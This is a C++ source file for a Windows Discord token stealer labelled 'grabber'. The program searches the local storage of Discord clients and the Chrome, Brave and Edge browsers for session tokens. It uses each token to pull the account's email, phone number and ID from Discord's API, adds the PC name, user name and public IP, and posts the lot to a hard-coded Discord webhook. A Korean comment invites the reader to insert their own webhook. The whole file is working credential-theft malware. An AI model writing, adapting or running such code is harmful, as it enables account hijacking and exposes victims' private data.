#define WIN32_LEAN_AND_MEAN
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0A00
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <dpapi.h>
#include <filesystem>
#include <fstream>
#include <string>
#include <vector>
#include <shlobj.h>
#include <winhttp.h>
#include <iphlpapi.h>
#include <nlohmann/json.hpp>
#include <algorithm>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "crypt32.lib")

namespace fs = std::filesystem;
using json = nlohmann::json;

// 테스트용 평문 웹훅 주소 (여기에 니 주소 넣어)
const std::wstring WEBHOOK_URL = L"https://discord.com/api/webhooks/1573595682634465314/NW6nQ5gqBKWgBazoucAQXTKQ9oeRUakiznXDrk5DC-wDJKeRIapPkzAxuD1ea9lX6Sdb";

std::wstring GetLocalAppData() {
    wchar_t* path = nullptr;
    SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, nullptr, &path);
    std::wstring r(path);
    CoTaskMemFree(path);
    return r;
}

typedef BOOL (WINAPI *pCryptUnprotectData)(DATA_BLOB*, LPWSTR*, DATA_BLOB*, LPVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*);
typedef HINTERNET (WINAPI *pWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET (WINAPI *pWinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
typedef HINTERNET (WINAPI *pWinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
typedef BOOL (WINAPI *pWinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL (WINAPI *pWinHttpReceiveResponse)(HINTERNET, LPVOID);
typedef BOOL (WINAPI *pWinHttpQueryDataAvailable)(HINTERNET, LPDWORD);
typedef BOOL (WINAPI *pWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL (WINAPI *pWinHttpCloseHandle)(HINTERNET);
typedef BOOL (WINAPI *pWinHttpAddRequestHeaders)(HINTERNET, LPCWSTR, DWORD, DWORD);

struct WinHttpAPI {
    pWinHttpOpen Open; pWinHttpConnect Connect; pWinHttpOpenRequest OpenReq;
    pWinHttpSendRequest Send; pWinHttpReceiveResponse Recv;
    pWinHttpQueryDataAvailable Avail; pWinHttpReadData Read; pWinHttpCloseHandle Close;
    pWinHttpAddRequestHeaders AddHdr;
    pCryptUnprotectData DPAPI;
} api;

bool InitAPI() {
    HMODULE hWinHttp = LoadLibraryA("winhttp.dll");
    if (!hWinHttp) return false;
    HMODULE hCrypt = LoadLibraryA("crypt32.dll");
    if (!hCrypt) return false;

    api.Open = (pWinHttpOpen)GetProcAddress(hWinHttp, "WinHttpOpen");
    api.Connect = (pWinHttpConnect)GetProcAddress(hWinHttp, "WinHttpConnect");
    api.OpenReq = (pWinHttpOpenRequest)GetProcAddress(hWinHttp, "WinHttpOpenRequest");
    api.Send = (pWinHttpSendRequest)GetProcAddress(hWinHttp, "WinHttpSendRequest");
    api.Recv = (pWinHttpReceiveResponse)GetProcAddress(hWinHttp, "WinHttpReceiveResponse");
    api.Avail = (pWinHttpQueryDataAvailable)GetProcAddress(hWinHttp, "WinHttpQueryDataAvailable");
    api.Read = (pWinHttpReadData)GetProcAddress(hWinHttp, "WinHttpReadData");
    api.Close = (pWinHttpCloseHandle)GetProcAddress(hWinHttp, "WinHttpCloseHandle");
    api.AddHdr = (pWinHttpAddRequestHeaders)GetProcAddress(hWinHttp, "WinHttpAddRequestHeaders");
    api.DPAPI = (pCryptUnprotectData)GetProcAddress(hCrypt, "CryptUnprotectData");

    return api.Open && api.Connect && api.OpenReq && api.Send && api.Recv && api.Avail && api.Read && api.Close && api.AddHdr && api.DPAPI;
}

std::string ReadFileBinary(const fs::path& p) {
    std::ifstream f(p, std::ios::binary);
    if (!f) return "";
    return std::string((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
}

std::string DecryptDPAPI(const std::vector<BYTE>& data) {
    DATA_BLOB in;
    in.pbData = const_cast<BYTE*>(data.data());
    in.cbData = (DWORD)data.size();

    DATA_BLOB out;
    out.pbData = nullptr;
    out.cbData = 0;

    if (!api.DPAPI(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) return "";
    
    std::string r((char*)out.pbData, out.cbData);
    if (out.pbData) LocalFree(out.pbData);
    return r;
}

bool IsTokenChar(char c) {
    return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '.' || c == '_' || c == '-';
}

std::vector<std::string> ScanLevelDB(const fs::path& dbDir) {
    std::vector<std::string> toks;
    if (!fs::exists(dbDir)) return toks;
    for (auto& e : fs::recursive_directory_iterator(dbDir)) {
        if (!e.is_regular_file()) continue;
        auto ext = e.path().extension().string();
        if (ext != ".ldb" && ext != ".log") continue;
        std::string raw = ReadFileBinary(e.path());
        
        for (size_t i = 0; i < raw.size(); ) {
            if (raw.substr(i, 4) == "mfa." && i + 88 <= raw.size()) {
                bool valid = true;
                for(size_t j=4; j<88; ++j) if(!IsTokenChar(raw[i+j])) { valid = false; break; }
                if(valid) { toks.push_back(raw.substr(i, 88)); i += 88; continue; }
            } else {
                size_t p1 = std::string::npos, p2 = std::string::npos;
                for (size_t j = i; j < i + 40 && j < raw.size(); ++j) {
                    if (raw[j] == '.') {
                        if (p1 == std::string::npos) p1 = j;
                        else if (p2 == std::string::npos) { p2 = j; break; }
                    } else if (!IsTokenChar(raw[j])) break;
                }
                if (p1 != std::string::npos && p2 != std::string::npos) {
                    size_t len1 = p1 - i, len2 = p2 - p1 - 1, len3 = 0;
                    for (size_t j = p2 + 1; j < raw.size() && IsTokenChar(raw[j]); ++j) len3++;
                    if (len1 >= 24 && len1 <= 28 && len2 == 6 && len3 >= 25 && len3 <= 38) {
                        toks.push_back(raw.substr(i, len1 + 1 + len2 + 1 + len3));
                        i = p2 + 1 + len3;
                        continue;
                    }
                }
            }
            i++;
        }
    }
    return toks;
}

std::vector<std::string> GrabDiscordTokens() {
    std::vector<std::string> all;
    std::wstring base = GetLocalAppData();
    const std::vector<std::wstring> clients = {
        L"Discord", L"discordcanary", L"discordptb", L"Lightcord",
        L"discorddevelopment", L"Google\\Chrome\\User Data",
        L"BraveSoftware\\Brave-Browser\\User Data", L"Microsoft\\Edge\\User Data"
    };
    for (auto& c : clients) {
        fs::path root = fs::path(base) / c;
        if (!fs::exists(root)) continue;
        for (auto& sub : { fs::path(L"Local Storage") / L"leveldb", fs::path(L"Default") / L"Local Storage" / L"leveldb" }) {
            auto found = ScanLevelDB(root / sub);
            all.insert(all.end(), found.begin(), found.end());
        }
    }
    std::sort(all.begin(), all.end());
    all.erase(std::unique(all.begin(), all.end()), all.end());
    return all;
}

std::string GetPCName() {
    wchar_t buf[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD sz = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(buf, &sz);
    int n = WideCharToMultiByte(CP_UTF8, 0, buf, -1, nullptr, 0, nullptr, nullptr);
    std::string s(n, 0);
    WideCharToMultiByte(CP_UTF8, 0, buf, -1, s.data(), n, nullptr, nullptr);
    return s;
}

std::string GetUserName() {
    wchar_t buf[256];
    DWORD sz = 256;
    GetUserNameW(buf, &sz);
    int n = WideCharToMultiByte(CP_UTF8, 0, buf, -1, nullptr, 0, nullptr, nullptr);
    std::string s(n, 0);
    WideCharToMultiByte(CP_UTF8, 0, buf, -1, s.data(), n, nullptr, nullptr);
    return s;
}

std::string HttpGet(LPCWSTR host, LPCWSTR path) {
    HINTERNET s = api.Open(L"x/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!s) return "";
    HINTERNET c = api.Connect(s, host, INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET r = api.OpenReq(c, L"GET", path, nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    api.Send(r, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    api.Recv(r, nullptr);
    std::string body; DWORD avail = 0;
    do {
        api.Avail(r, &avail); if (!avail) break;
        std::vector<char> b(avail + 1); DWORD rd = 0;
        api.Read(r, b.data(), avail, &rd); body.append(b.data(), rd);
    } while (avail > 0);
    api.Close(r); api.Close(c); api.Close(s);
    return body;
}

std::string DiscordGet(const std::string& token, LPCWSTR path) {
    HINTERNET s = api.Open(L"x/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET c = api.Connect(s, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET r = api.OpenReq(c, L"GET", path, nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    
    std::wstring wToken(token.begin(), token.end());
    std::wstring auth = L"Authorization: " + wToken;
    api.AddHdr(r, auth.c_str(), -1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    
    api.Send(r, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    api.Recv(r, nullptr);

    DWORD status = 0, sz = sizeof(status);
    WinHttpQueryHeaders(r, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz, WINHTTP_NO_HEADER_INDEX);

    std::string body;
    if (status == 200) {
        DWORD avail = 0;
        do {
            api.Avail(r, &avail); if (!avail) break;
            std::vector<char> b(avail + 1); DWORD rd = 0;
            api.Read(r, b.data(), avail, &rd); body.append(b.data(), rd);
        } while (avail > 0);
    }
    api.Close(r); api.Close(c); api.Close(s);
    return body;
}

void SendWebhook(const json& payload) {
    HINTERNET s = api.Open(L"x/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET c = api.Connect(s, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    
    std::wstring path = WEBHOOK_URL.substr(WEBHOOK_URL.find(L"/api/"));
    HINTERNET r = api.OpenReq(c, L"POST", path.c_str(), nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    
    std::wstring hdr = L"Content-Type: application/json\r\n";
    api.AddHdr(r, hdr.c_str(), -1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    
    std::string body = payload.dump();
    api.Send(r, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)body.data(), (DWORD)body.size(), (DWORD)body.size(), 0);
    api.Recv(r, nullptr);
    api.Close(r); api.Close(c); api.Close(s);
}

int main() {
    Sleep(3000);
    
    if (!InitAPI()) return 1;

    auto tokens = GrabDiscordTokens();
    if (tokens.empty()) return 1;

    json accounts = json::array();
    json emails = json::array();
    json phones = json::array();

    for (auto& t : tokens) {
        std::string raw = DiscordGet(t, L"/api/v9/users/@me");
        if (raw.empty()) continue;
        try {
            auto j = json::parse(raw);
            std::string em = j.value("email", "");
            std::string ph = j.value("phone", "");
            if (!em.empty()) emails.push_back(em);
            if (!ph.empty()) phones.push_back(ph);
            accounts.push_back({
                {"token", t},
                {"username", j.value("username","")},
                {"global_name", j.value("global_name","")},
                {"email", em},
                {"phone", ph},
                {"id", j.value("id","")},
                {"mfa", j.value("mfa_enabled", false)}
            });
        } catch (...) {}
    }

    if (accounts.empty()) return 1;

    json payload = {
        {"username", "grabber"},
        {"embeds", json::array({
            {
                {"title", "Discord Tokens Captured"},
                {"color", 0x5865F2},
                {"fields", json::array({
                    {{"name", "PC Name"}, {"value", GetPCName()}, {"inline", true}},
                    {{"name", "User"}, {"value", GetUserName()}, {"inline", true}},
                    {{"name", "Public IP"}, {"value", HttpGet(L"api.ipify.org", L"/")}, {"inline", true}},
                    {{"name", "Local IP"}, {"value", "check_manually"}, {"inline", true}},
                    {{"name", "Emails"}, {"value", emails.empty() ? "none" : emails.dump()}, {"inline", false}},
                    {{"name", "Phones"}, {"value": phones.empty() ? "none" : phones.dump()}, {"inline", false}},
                    {{"name", "Tokens"}, {"value", accounts.dump(2)}, {"inline", false}}
                })}
            }
        })}
    };

    SendWebhook(payload);

    std::ofstream f("tokens.json");
    f << accounts.dump(2);
    return 0;
}
